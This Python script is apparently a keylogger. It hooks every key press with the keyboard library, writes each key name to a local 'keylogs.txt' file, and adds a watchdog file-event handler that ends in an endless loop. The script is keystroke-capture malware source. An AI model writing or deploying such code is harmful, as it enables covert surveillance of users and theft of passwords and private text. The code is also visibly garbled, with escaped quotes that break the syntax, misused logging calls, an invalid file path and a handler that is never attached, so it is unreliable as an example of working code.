import keyboard
import logging
import os
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# Set up a logger object to write logs to file
logger = logging.getLogger(__name__)
logging.basicConfig(filename='keylogs.txt', level=logging.INFO, format='%(levelname)s:%(message)s')

exception_log = open("exceptions.txt", "a")
exception_log.write("\n \n-------------------NEW LOGGING SESSION--------------------\n")

# Close the exception log file to let logging module write logs
exception_log.close()

# Set up a handler that saves all debug logs to file
debug_handler = logging.StreamHandler()
debug_handler.setLevel(logging.DEBUG)
logger.addHandler(debug_handler)

# Define function that gets called when a key is pressed
def on_key_press(e): 
    debug_handler.emit(logging.LogRecord(\'DEBUG\', logging.DEBUG, __file__, 1, e.name + ' pressed', None, None))
    logger.info(e.name)

# Start listening for keypresses 
keyboard.on_press(on_key_press)

class LoggingEventHandler(FileSystemEventHandler):
    def on_any_event(self, event):
        '''On_any_event method triggers when any event happens (created/modified/deleted/ moved) within the directory 

        Arguments:
            event {Event} -- The event object containing the details of the system event.
        '''
        if event.src_path.endswith("exceptions.txt"):
            with open(f"{os.path.basename(__file__)}/keylogs{len([a for a in os.listdir(os.getcwd()) if 'keylogs' in a or 'log' in a])}", "w") as log_file:
                print("Logging started, Press Ctrl+C to stop.")
                while True:
                    pass # END CODE 

